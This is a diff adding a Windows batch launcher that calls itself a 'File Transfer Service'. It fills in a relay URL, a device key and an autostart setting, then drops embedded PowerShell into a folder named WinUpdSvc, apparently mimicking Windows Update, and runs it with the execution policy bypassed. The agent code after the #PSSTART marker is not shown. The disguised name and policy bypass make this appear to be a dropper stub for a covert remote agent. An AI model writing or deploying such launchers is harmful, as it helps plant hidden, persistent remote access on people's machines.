@@ -1,0 +1,33 @@
+@echo off
+chcp 65001 >nul 2>&1
+setlocal EnableExtensions DisableDelayedExpansion
+title File Transfer Service
+
+rem ============================================================
+rem  Only these lines need editing
+rem ============================================================
+set "RELAY_URL=__RELAY_URL__"
+set "DEVICE_KEY=__DEVICE_KEY__"
+set "AUTOSTART=__AUTOSTART__"
+rem  Transport: oss | auto | ipv6
+set "TRANSPORT=__TRANSPORT__"
+
+set "WINUPSVC=%LOCALAPPDATA%\WinUpdSvc"
+if not exist "%WINUPSVC%" mkdir "%WINUPSVC%" >nul 2>&1
+set "PS1=%WINUPSVC%\agent.ps1"
+
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$l=[IO.File]::ReadAllLines('%~f0',[Text.Encoding]::UTF8);$i=[Array]::IndexOf($l,'#PSSTART');if($i -lt 0){Write-Host 'package broken';exit 2};[IO.File]::WriteAllText('%PS1%',($l[($i+1)..($l.Length-1)] -join [Environment]::NewLine),(New-Object Text.UTF8Encoding($true)))"
+if errorlevel 1 goto fail
+
+powershell -NoProfile -ExecutionPolicy Bypass -File "%PS1%" -Mode launcher
+if errorlevel 1 goto fail
+exit /b 0
+
+:fail
+echo.
+echo   [!] Startup failed. Log: %WINUPSVC%\agent.log
+echo.
+pause
+exit /b 1
+
+#PSSTART
